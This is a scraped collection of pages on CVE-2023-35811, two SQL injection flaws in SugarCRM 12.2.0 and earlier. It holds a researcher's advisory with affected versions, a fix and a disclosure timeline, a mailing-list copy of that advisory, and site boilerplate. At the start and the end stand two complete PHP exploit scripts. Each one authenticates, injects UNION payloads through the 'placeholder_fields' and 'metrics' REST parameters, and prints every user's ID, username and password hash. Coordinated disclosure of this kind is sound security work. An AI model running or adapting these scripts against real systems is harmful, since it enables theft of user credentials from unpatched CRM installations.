=== Content from karmainsecurity.com_3bc55b93_20250115_205918.html ===
php
set\_time\_limit(0);
error\_reporting(E\_ERROR);
if (!extension\_loaded("curl")) die("[-] cURL extension required!\n");
if ($argc != 4) die("Usage: php $argv[0] <URL  \n");
list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
print "[-] Logging in with username '{$user}' and password '{$pass}'\n";
$ch = curl\_init();
$login = ["username" => $user, "password" => $pass, "grant\_type" => "password", "client\_id" => "sugar"];
curl\_setopt($ch, CURLOPT\_URL, "{$url}rest/v10/oauth2/token");
curl\_setopt($ch, CURLOPT\_POSTFIELDS, json\_encode($login));
curl\_setopt($ch, CURLOPT\_HTTPHEADER, ["Content-Type: application/json"]);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
if (($token = (json\_decode(curl\_exec($ch)))->access\_token) == null) die("[-] Login failed!\n");
print "[-] Getting note ID\n";
curl\_setopt($ch, CURLOPT\_URL, "{$url}rest/v10/Notes");
curl\_setopt($ch, CURLOPT\_HTTPHEADER, ["OAuth-Token: {$token}"]);
curl\_setopt($ch, CURLOPT\_POST, false);
if (!preg\_match('/"id":"([^"]+)"/', curl\_exec($ch), $record)) die("[-] Note ID not found!\n");
print "[-] Executing SQL injection attack\n";
$concat = "CONCAT(id,'||',user\_name,'||',user\_hash)";
$sql = urlencode("AS date\_modified, 'Users' AS module, {$concat} AS id FROM users WHERE 1=1 OR 1 IN (?,?,?,?,?) UNION SELECT 1,'Users',3 FROM emails WHERE ((emails.team\_set\_id IN (SELECT tst.team\_set\_id FROM team\_sets\_teams tst#");
$params = "module\_list=Emails&placeholder\_fields[Emails][{$sql}]={$sql}";
curl\_setopt($ch, CURLOPT\_URL, "{$url}rest/v10/Notes/{$record[1]}/link/history?{$params}");
if (($records = (json\_decode(curl\_exec($ch)))->records) == null) die("[-] Attack failed!\n");
print "============================================================================\n";
foreach ($records as $record)
{
if (count($info = explode("||", $record->id)) != 3) continue;
print "[-] User ID...: {$info[0]}\n";
print "[-] Username..: {$info[1]}\n";
print "[-] Password..: {$info[2]}\n";
print "============================================================================\n";
}


=== Content from packetstormsecurity.com_8637a449_20250114_233037.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from karmainsecurity.com_09917d1d_20250115_205917.html ===

[egix@karmainsecurity ~ $](https://karmainsecurity.com/)

* [~/research](https://karmainsecurity.com/research)
* [~/blog](https://karmainsecurity.com/blog)
* [~/about](https://karmainsecurity.com/about)

# SugarCRM <= 12.2.0 Two SQL Injection Vulnerabilities

#### â¢ Software Link:

<https://www.sugarcrm.com>

#### â¢ Affected Versions:

Version 12.2.0 and prior versions.

Version 12.0.2 and prior versions.

Version 11.0.5 and prior versions.

#### â¢ Vulnerabilities Description:

1. User input passed through the **“metrics”** parameter to the **"/Forecasts/metrics"** REST API endpoint is not properly sanitized before being used to construct a SQL query. This can be exploited by malicious users to e.g. read sensitive data from the database through in-band SQL Injection attacks.
2. User input passed through the **“placeholder\_fields”** parameter to the e.g. **"/Notes/{recordID}/link/history"** REST API endpoint is not properly sanitized before being used to construct a SQL query. This can be exploited by malicious users to e.g. read sensitive data from the database through in-band SQL Injection attacks.

#### â¢ Proof of Concept:

[https://karmainsecurity.com/pocs/CVE-2023-35811\_1.php](/pocs/CVE-2023-35811_1.php)

[https://karmainsecurity.com/pocs/CVE-2023-35811\_2.php](/pocs/CVE-2023-35811_2.php)

#### â¢ Solution:

Upgrade to version 12.3.0, 12.0.3, 11.0.6, or later.

#### â¢ Disclosure Timeline:

[14/02/2023] â Vendor notified

[12/04/2023] â Fixed versions released

[17/06/2023] â CVE number assigned

[23/08/2023] â Publication of this advisory

#### â¢ CVE Reference:

The Common Vulnerabilities and Exposures project ([cve.mitre.org](http://cve.mitre.org)) has assigned the name [CVE-2023-35811](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-35811) to these vulnerabilities.

#### â¢ Credits:

Vulnerabilities discovered by Egidio Romano.

#### â¢ Other References:

<https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-008>

Karma(In)Security © 2025



=== Content from seclists.org_d04f0616_20250114_233040.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

![](/shared/images/nst-icons.svg#search)

# [KIS-2023-08] SugarCRM <= 12.2.0 Two SQL Injection Vulnerabilities

---

*From*: Egidio Romano <research () karmainsecurity com>

*Date*: Wed, 23 Aug 2023 14:13:03 +0200

---

```

----------------------------------------------------
SugarCRM <= 12.2.0 Two SQL Injection Vulnerabilities
----------------------------------------------------

[-] Software Link:

<https://www.sugarcrm.com>

[-] Affected Versions:

Version 12.2.0 and prior versions.
Version 12.0.2 and prior versions.
Version 11.0.5 and prior versions.

[-] Vulnerabilities Description:

```
1) User input passed through the “metrics” parameter to the
“/Forecasts/metrics”
REST API endpoint is not properly sanitized before being used to
construct a SQL
query. This can be exploited by malicious users to e.g. read sensitive
data from
```

the database through in-band SQL Injection attacks.

```
2) User input passed through the “placeholder\_fields” parameter to the
e.g.
“/Notes/{recordID}/link/history” REST API endpoint is not properly
sanitized before
being used to construct a SQL query. This can be exploited by malicious
users to
e.g. read sensitive data from the database through in-band SQL Injection
attacks.
```

[-] Proof of Concept:

<https://karmainsecurity.com/pocs/CVE-2023-35811_1.php>
<https://karmainsecurity.com/pocs/CVE-2023-35811_2.php>

[-] Solution:

Upgrade to version 12.3.0, 12.0.3, 11.0.6, or later.

[-] Disclosure Timeline:

[14/02/2023] - Vendor notified
[12/04/2023] - Fixed versions released
[17/06/2023] - CVE number assigned
[23/08/2023] - Publication of this advisory

[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2023-35811 to these vulnerabilities.

[-] Credits:

Vulnerabilities discovered by Egidio Romano.

[-] Original Advisory:

<https://karmainsecurity.com/KIS-2023-08>

[-] Other References:

<https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-008/>
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

### Current thread:

* **[KIS-2023-08] SugarCRM <= 12.2.0 Two SQL Injection Vulnerabilities** *Egidio Romano (Aug 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from support.sugarcrm.com_ed93e4fb_20250114_233042.html ===


 Let the platform do the work
[SugarClub](https://sugarclub.sugarcrm.com "SugarClub")[Contact](https://www.sugarcrm.com/contact-us/ "Contact")+1 (877) 842-7276

Get Started

Documentation

Get Help

# Product Guides

[![SugarCRM](https://auth.sugarcrm.com/images/svg/sugarcrm-logo-white.svg)](https://www.sugarcrm.com)

[Contact Us](https://support.sugarcrm.com/Resources/Contacting_SugarCRM/)

 Â© 2023 SugarCRM. All Rights Reserved.

[Terms of Use](https://www.sugarcrm.com/legal/terms-of-use/)
[Privacy Policy](https://www.sugarcrm.com/legal/privacy-policy/)
[Legal](https://www.sugarcrm.com/legal/)



=== Content from karmainsecurity.com_19bea11e_20250115_205919.html ===
php
set\_time\_limit(0);
error\_reporting(E\_ERROR);
if (!extension\_loaded("curl")) die("[-] cURL extension required!\n");
if ($argc != 4) die("Usage: php $argv[0] <URL  \n");
list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
print "[-] Logging in with username '{$user}' and password '{$pass}'\n";
$ch = curl\_init();
$login = ["username" => $user, "password" => $pass, "grant\_type" => "password", "client\_id" => "sugar"];
curl\_setopt($ch, CURLOPT\_URL, "{$url}rest/v10/oauth2/token");
curl\_setopt($ch, CURLOPT\_POSTFIELDS, json\_encode($login));
curl\_setopt($ch, CURLOPT\_HTTPHEADER, ["Content-Type: application/json"]);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
if (($token = (json\_decode(curl\_exec($ch)))->access\_token) == null) die("[-] Login failed!\n");
print "[-] Executing SQL injection attack\n";
curl\_setopt($ch, CURLOPT\_URL, "{$url}rest/v10/Forecasts/metrics");
curl\_setopt($ch, CURLOPT\_HTTPHEADER, ["OAuth-Token: {$token}", "Content-Type: application/json"]);
$in = "''";
$sql = "1), CONCAT(id,'||',user\_name,'||',user\_hash) metric\_count FROM users WHERE user\_name NOT IN (%s) UNION SELECT 1,2,3 FROM purchased\_line\_items WHERE ((purchased\_line\_items.team\_set\_id IN (SELECT tst.team\_set\_id FROM team\_sets\_teams tst#";
$params = ["module" => "PurchasedLineItems", "filter" => [], "user\_id" => "", "type" => "", "time\_period" => "", "metrics" => [0 => ["filter" => []]]];
print "============================================================================\n";
while(1)
{
$params["metrics"][0]["sum\_fields"] = sprintf($sql, $in);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, json\_encode($params));
if (($metrics = (json\_decode(curl\_exec($ch), true))["metrics"]) == null) die("[-] Attack failed!\n");
if (count($info = explode("||", $metrics[""]["values"]["count"])) != 3) break;
$in .= ",'{$info[1]}'";
print "[-] User ID...: {$info[0]}\n";
print "[-] Username..: {$info[1]}\n";
print "[-] Password..: {$info[2]}\n";
print "============================================================================\n";
}

